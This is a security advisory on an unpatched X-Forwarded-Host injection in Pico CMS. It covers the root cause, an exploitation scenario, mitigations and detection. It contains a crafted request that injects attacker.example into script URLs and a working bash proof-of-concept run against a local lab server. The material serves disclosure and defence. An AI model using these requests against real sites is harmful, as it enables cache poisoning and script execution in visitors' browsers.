# Security Advisory: External Resource URL Injection via Untrusted X-Forwarded-Host in Pico CMS

> **Identifier:** Pending CVE assignment
> **Publication Date:** 09/10/2026
> **Last Updated:** 27/10/2026
> **Severity:** Medium
> **CVSS:** 5.9 — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N`
> **CWE:** CWE-346: Origin Validation Error
> **Status:** Unpatched — no vendor fix identified in the evaluated versions

---

## 1. Executive Summary

Pico CMS 2.1.4 and 3.0.0-alpha.2 accept `X-Forwarded-Host`, `X-Forwarded-Proto`, and `X-Forwarded-Port` from any requester when `base_url` is in automatic mode, embedding the supplied values in canonical, stylesheet, image, and JavaScript URLs in the response. An unauthenticated network requester can therefore inject attacker-controlled hosts into all absolute resource URLs. If a shared intermediary caches the generated HTML without varying its key on the forwarded headers, subsequent visitors receive the injected URLs and their browsers load attacker-hosted JavaScript, constituting a conditional cache-poisoning and stored XSS chain. The lab confirmed resource URL injection and browser-side JavaScript execution; cache reuse by a shared proxy was not demonstrated and is required for impact on a third-party user.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| Pico CMS | 2.1.4 | None | Affected |
| Pico CMS | 3.0.0-alpha.2 | None | Affected |
| `lib/Pico.php::getBaseUrl()` | Both above | None | Affected |

- **Repository:** https://github.com/picocms/Pico
- **Evaluated stack:** PHP 8.1.34, Apache 2.4.65, Debian, Docker compose lab

### Unaffected Products

- Any deployment with an explicit `base_url` set in `config/config.yml` — the early return in `getBaseUrl()` bypasses forwarded-header processing.

---

## 3. Vulnerability Description

`Pico::getBaseUrl()` checks `$_SERVER['HTTP_X_FORWARDED_HOST']` before `$_SERVER['HTTP_HOST']` and uses the supplied value directly to construct the application's base URL. No check is made against `REMOTE_ADDR` or a configured trusted-proxy list. The resulting URL propagates into every theme variable (`base_url`, `theme_url`, `plugins_url`, `assets_url`) and is rendered into `<link href>` and `<script src>` attributes without further sanitisation.

**Root cause:**

```php
// lib/Pico.php:2195-2234
$host = 'localhost';
if (!empty($_SERVER['HTTP_X_FORWARDED_HOST'])) {
    $host = $_SERVER['HTTP_X_FORWARDED_HOST'];   // ← no proxy authentication
} elseif (!empty($_SERVER['HTTP_HOST'])) {
    $host = $_SERVER['HTTP_HOST'];
}
// ...
$this->config['base_url'] = $protocol . '://' . $host . $basePath;
return $this->config['base_url'];
```

### Necessary Conditions

- **Authentication:** None
- **User interaction:** Required (victim must load a cached poisoned response)
- **Attack vector:** Network
- **Preconditions:** `base_url` unset or null; for cache-poisoning chain, a shared intermediary must cache the response without varying on the forwarded headers

---

## 4. Impact

An unauthenticated requester can make Pico embed attacker-selected hosts in all absolute resource URLs in its HTML response. Under the conditional cache chain, a victim who receives the stored response will have attacker-controlled JavaScript execute in the document origin of the affected site.

- **Confidentiality — Low:** Conditional access to browser-visible information available to the site's origin
- **Integrity — High:** Conditional script execution can modify page content and issue same-origin actions
- **Availability — None:** No availability impact was established

---

## 5. Classification

### CVSS

- **Score:** 5.9
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | High |
| Privileges Required (PR) | None |
| User Interaction (UI) | Required |
| Scope (S) | Unchanged |
| Confidentiality (C) | Low |
| Integrity (I) | High |
| Availability (A) | None |

### CWE

- CWE-346: Origin Validation Error

### CAPEC

- CAPEC-141: Cache Poisoning

---

## 6. Exploitation Scenario

1. Attacker identifies a Pico deployment with `base_url: ~` and a caching proxy in front that does not vary its cache key on `X-Forwarded-Host`.
2. Attacker sends `GET / HTTP/1.1` with `X-Forwarded-Host: attacker.example` and `X-Forwarded-Proto: https`; Pico returns HTML with `<script src="https://attacker.example/themes/default/js/pico.js">`.
3. The proxy stores the response at the canonical cache key; legitimate visitors requesting the same URL receive the poisoned HTML.
4. Victim browsers load JavaScript from `attacker.example`; the script executes in the Pico site's document origin.

---

## 7. Technical Evidence

### Affected Component

```text
File:      lib/Pico.php
Function:  getBaseUrl()
Lines:     2188–2235
Parameter: HTTP_X_FORWARDED_HOST (HTTP request header)
Method:    GET · Authentication: not required
```

### Example Request

```http
GET / HTTP/1.1
Host: pico.local
X-Forwarded-Host: attacker.example
X-Forwarded-Proto: https
X-Forwarded-Port: 443
```

### Observed Response (excerpt)

```html
<link rel="canonical" href="https://attacker.example/" />
<link rel="stylesheet" href="https://attacker.example/themes/default/css/style.css" />
<script src="https://attacker.example/themes/default/js/modernizr-3.3.1-custom.min.js"></script>
<script src="https://attacker.example/themes/default/js/pico.js"></script>
```

### Result

Reproduced in an authorized local Docker compose lab against Pico 2.1.4 (port 9087) and 3.0.0-alpha.2 (port 9088). Browser-side JavaScript execution was confirmed by rendering the injected HTML in Chromium headless and observing DOM modification by the attacker-controlled script. Tests were non-destructive; no production system or real CDN was used.

**Evidence:** [`evidence/vulnerability-exposure.png`](./evidence/vulnerability-exposure.png), [`evidence/poc-execution.png`](./evidence/poc-execution.png)

---

## 8. Proof of Concept

O PoC é para ambientes autorizados apenas. Demonstra injeção de URL de recursos e execução de JavaScript no navegador; não inclui cache compartilhado e não reivindica cache poisoning contra terceiros.

```bash
#!/bin/bash
# ============================================================================
# PoC: External resource URL injection via X-Forwarded-Host in Pico CMS
# ============================================================================
#
# Vulnerability: Untrusted X-Forwarded-Host in getBaseUrl() causes external
#                resource URL injection (conditional cache poisoning / XSS)
# Affected:      Pico CMS 2.1.4, 3.0.0-alpha.2
# CWE:           CWE-346 (Origin Validation Error)
# CVSS:          5.9 Medium — CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N
# Tested:        2026-10-09, authorized local lab
#
# Prerequisites:
#   - Pico CMS running on http://127.0.0.1:9087 (base_url: ~)
#   - PHP CLI available (for attacker resource server)
#   - curl available
#   - chromium or chromium-browser available
#
# Usage (from repository root):
#   php -S 127.0.0.1:8888 report/pico-xfh-cache-poisoning-xss/scripts/attacker-root/evil.php &
#   bash report/pico-xfh-cache-poisoning-xss/poc.sh
#
# This PoC is for authorized security testing only.
# It does not access production systems, real CDNs, or third-party hosts.
# ============================================================================

set -e

PICO_URL="${PICO_URL:-http://127.0.0.1:9087}"
ATTACKER_HOST="${ATTACKER_HOST:-127.0.0.1:8888}"
ATTACKER_URL="http://$ATTACKER_HOST"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
OUTPUT_DIR="$SCRIPT_DIR/evidence"
mkdir -p "$OUTPUT_DIR"

echo "============================================================"
echo " Pico CMS — X-Forwarded-Host Resource URL Injection PoC"
echo "============================================================"
echo " Target:       $PICO_URL"
echo " Attacker CDN: $ATTACKER_URL"
echo " Evidence:     $OUTPUT_DIR"
echo ""

# ---------------------------------------------------------------------------
# Step 1: Verify Pico is accessible
# ---------------------------------------------------------------------------
echo "[*] Step 1: Verifying Pico CMS is accessible..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$PICO_URL")
if [ "$HTTP_CODE" != "200" ]; then
    echo "[-] Error: Pico CMS returned HTTP $HTTP_CODE at $PICO_URL"
    echo "    Start the lab with: docker compose up -d"
    exit 1
fi
echo "[+] Pico CMS is accessible (HTTP $HTTP_CODE)"

# ---------------------------------------------------------------------------
# Step 2: Verify attacker resource server is accessible
# ---------------------------------------------------------------------------
echo "[*] Step 2: Verifying attacker resource server..."
CONTENT_TYPE=$(curl -s -o /dev/null -w "%{content_type}" "$ATTACKER_URL/test.js")
if ! echo "$CONTENT_TYPE" | grep -q "javascript"; then
    echo "[-] Error: Attacker server not serving JavaScript at $ATTACKER_URL/test.js"
    echo "    Start it with:"
    echo "    php -S $ATTACKER_HOST $SCRIPT_DIR/scripts/attacker-root/evil.php"
    exit 1
fi
echo "[+] Attacker server is accessible (Content-Type: $CONTENT_TYPE)"

# ---------------------------------------------------------------------------
# Step 3: Send crafted request — inject attacker host into Pico's response
# ---------------------------------------------------------------------------
echo "[*] Step 3: Sending crafted request with X-Forwarded-Host: $ATTACKER_HOST..."
curl -s \
    -H "X-Forwarded-Host: $ATTACKER_HOST" \
    -H "X-Forwarded-Proto: http" \
    "$PICO_URL/" > "$OUTPUT_DIR/poisoned_response.html"
echo "[+] Header-influenced response saved: poisoned_response.html"

# ---------------------------------------------------------------------------
# Step 4: Verify URL injection in the response
# ---------------------------------------------------------------------------
echo "[*] Step 4: Verifying injected resource URLs..."
INJECTED=$(grep -c "src=\"http://$ATTACKER_HOST\|href=\"http://$ATTACKER_HOST" \
    "$OUTPUT_DIR/poisoned_response.html" || true)
if [ "$INJECTED" -lt 1 ]; then
    echo "[-] Error: No injected URLs found for $ATTACKER_HOST in response"
    exit 1
fi
echo "[+] Confirmed: $INJECTED resource URL(s) point to the controlled server"
grep -E '<script src|canonical|stylesheet' "$OUTPUT_DIR/poisoned_response.html" \
    | grep "$ATTACKER_HOST" | head -4 | sed 's/^/    /'

# ---------------------------------------------------------------------------
# Step 5: Render poisoned HTML in browser — confirm JS execution
# ---------------------------------------------------------------------------
echo "[*] Step 5: Rendering poisoned response in browser (confirms JS execution)..."
SCREENSHOT="$OUTPUT_DIR/poc-execution.png"

if command -v chromium &>/dev/null; then
    BROWSER="chromium"
elif command -v chromium-browser &>/dev/null; then
    BROWSER="chromium-browser"
else
    echo "[-] Error: chromium / chromium-browser not found — skipping browser step"
    BROWSER=""
fi

if [ -n "$BROWSER" ]; then
    $BROWSER --headless --no-sandbox --disable-gpu --hide-scrollbars \
        --virtual-time-budget=4000 --window-size=1200,850 \
        --screenshot="$SCREENSHOT" \
        "file://$OUTPUT_DIR/poisoned_response.html" 2>/dev/null

    if [ -f "$SCREENSHOT" ]; then
        echo "[+] Screenshot saved: poc-execution.png ($(du -sh "$SCREENSHOT" | cut -f1))"
    else
        echo "[-] Warning: Screenshot not created"
    fi
fi

# ---------------------------------------------------------------------------
# Step 6: Baseline control — normal request without injected header
# ---------------------------------------------------------------------------
echo "[*] Step 6: Baseline control (no X-Forwarded-Host header)..."
BASELINE=$(curl -s "$PICO_URL/" | grep -c "src=\"http://$ATTACKER_HOST\|href=\"http://$ATTACKER_HOST" || true)
if [ "$BASELINE" -eq 0 ]; then
    echo "[+] Baseline clean: normal response contains 0 injected URLs"
else
    echo "[-] Warning: Baseline response contains injected URLs ($BASELINE) — check config"
fi

# ---------------------------------------------------------------------------
# Step 7: Extract injected URLs to evidence file
# ---------------------------------------------------------------------------
echo "[*] Step 7: Extracting evidence..."
grep -E '<script src|<link rel=.canonical|stylesheet' "$OUTPUT_DIR/poisoned_response.html" \
    | grep "$ATTACKER_HOST" | head -5 > "$OUTPUT_DIR/poisoned_urls.txt"

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo ""
echo "============================================================"
echo " [+] PoC Complete"
echo "============================================================"
echo ""
echo " Evidence files:"
echo "   $OUTPUT_DIR/poisoned_response.html  — full injected HTML response"
echo "   $OUTPUT_DIR/poisoned_urls.txt        — extracted injected URL lines"
[ -f "$SCREENSHOT" ] && echo "   $SCREENSHOT  — browser execution screenshot"
echo ""
echo " What was confirmed:"
echo "   1. GET / with X-Forwarded-Host: $ATTACKER_HOST"
echo "      → Pico returns <script src=\"http://$ATTACKER_HOST/...\"> in HTML"
echo "   2. Browser renders poisoned HTML and loads JS from the controlled server"
echo "   3. Baseline GET / (no header) returns only legitimate resource URLs"
echo ""
echo " What was NOT claimed:"
echo "   - Cache poisoning against a third-party user (requires shared cache)"
echo "   - The lab does not include a shared caching proxy"
echo "   - No production system or real CDN was contacted"
echo ""
echo " Mitigation:"
echo "   Set base_url explicitly in config/config.yml:"
echo "     base_url: https://www.example.com/"
echo "   Strip X-Forwarded-* headers at the edge proxy."
```

### Expected Result

```text
[+] <link rel="canonical" href="http://127.0.0.1:8888/" />
[+] <script src="http://127.0.0.1:8888/themes/default/js/pico.js"></script>
[+] Browser renders poisoned_response.html and loads JS from controlled server
[+] DOM modified: banner injected by attacker-controlled script
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove third-party data.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.
- Does not include or compromise a shared production cache.

---

## 9. Reproduction Steps

1. Start Pico CMS in the authorized lab: `docker compose up -d` (port 9087, `base_url: ~`).
2. Start the controlled resource server: `php -S 127.0.0.1:8888 report/pico-xfh-cache-poisoning-xss/scripts/attacker-root/evil.php`.
3. Run `bash report/pico-xfh-cache-poisoning-xss/poc.sh`.
4. Observe that `evidence/poisoned_response.html` contains `<script src="http://127.0.0.1:8888/...">`.
5. Open `evidence/poc-execution.png` — the attacker-controlled JS banner is visible in the rendered page.
6. Compare: `curl -s http://127.0.0.1:9087/ | grep script` without the header shows only the legitimate host.

---

## 10. Mitigation

Until an official fix is available:

- Set an explicit `base_url` in `config/config.yml` — this bypasses the forwarded-header code path entirely.
- At the edge proxy, strip all client-supplied `X-Forwarded-*` headers and set canonical values before passing requests to Pico.
- Restrict public access to the backend; only the trusted proxy should reach Pico directly.
- Add a restrictive Content Security Policy as defense in depth: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`.
- Configure the cache to vary its key on `Host` and `X-Forwarded-Host`.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix as of 27/10/2026.**

Recommended vendor actions:

1. Ignore `X-Forwarded-*` headers by default in `getBaseUrl()`.
2. Add a `trusted_proxies` configuration option (list of CIDR ranges).
3. Use forwarded headers only when `REMOTE_ADDR` matches a configured trusted proxy.
4. Validate the resolved host against a configured allowlist; reject unexpected values.
5. Document that an explicit `base_url` is the safest production configuration.

### Recommended Change to Vendor

```php
// getBaseUrl() — trust forwarded headers only from configured proxies
$trustedProxies = $this->getConfig('trusted_proxies') ?? [];
$remoteAddr = $_SERVER['REMOTE_ADDR'] ?? '';
$isTrusted = in_array($remoteAddr, $trustedProxies, true);

$host = 'localhost';
if ($isTrusted && !empty($_SERVER['HTTP_X_FORWARDED_HOST'])) {
    $host = $_SERVER['HTTP_X_FORWARDED_HOST'];
} elseif (!empty($_SERVER['HTTP_HOST'])) {
    $host = $_SERVER['HTTP_HOST'];
}
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Access log entries where `X-Forwarded-Host` contains a domain outside the deployment's allowlist.
- Cached HTML served to users that contains resource URLs for unexpected domains.
- Outbound browser requests to unknown stylesheet or script origins in CSP reports.

### Example Log Search

```text
# Apache / nginx access log
grep -i 'X-Forwarded-Host' access.log | grep -v 'trusted-proxy-ip'

# CSP violation reports
grep '"blocked-uri"' csp-reports.json | grep -v 'self\|your-domain.example'
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 09/10/2026 | Header trust issue identified and tested in the authorized lab |
| 09/10/2026 | External JavaScript resource execution reproduced |
| 19/10/2026 | Finding reframed as resource URL injection with conditional cache poisoning/XSS impact |
| 23/10/2026 | Documentation reconciled with retained PoC and evidence artifacts |
| 27/10/2026 | Advisory finalized |
| Pending | Vendor notification via GitHub Private Security Advisory |
| Pending | CVE requested |
| Pending | Vendor assessment and coordinated remediation |
| Pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** picocms / Gilbert Pellegrom
- **Channel used:** GitHub Private Security Advisory (pending submission)
- **Date of first notification:** Pending
- **Response status:** Not yet notified
- **Vendor position:** N/A

---

## 15. Credits

- **Researcher:** Independent security researcher
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-346: https://cwe.mitre.org/data/definitions/346.html
- CVSS v3.1 calculator: https://www.first.org/cvss/calculator/3.1
- Pico CMS repository: https://github.com/picocms/Pico
- CAPEC-141: https://capec.mitre.org/data/definitions/141.html

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 09/10/2026 | Initial documentation |
| 1.1 | 19/10/2026 | Reframed as URL injection with conditional cache impact |
| 1.2 | 23/10/2026 | Evidence reconciliation |
| 1.3 | 27/10/2026 | Full advisory format, PoC integrated |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes. Testing was performed only in an authorized local lab. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/picocms/Pico
